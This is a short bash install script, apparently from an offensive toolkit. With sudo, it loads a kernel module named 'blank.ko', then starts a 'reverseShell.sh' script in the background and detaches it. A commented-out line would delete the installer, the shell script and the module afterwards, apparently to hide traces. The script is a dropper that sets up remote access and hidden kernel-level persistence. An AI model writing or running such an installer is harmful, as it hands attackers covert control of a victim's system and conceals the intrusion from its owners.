#!/bin/bash

sudo insmod blank.ko &&
./reverseShell.sh & disown


sleep 10 #TODO: check reverse shell finished
#rm -rf install.sh reverseShell.sh  blank.ko
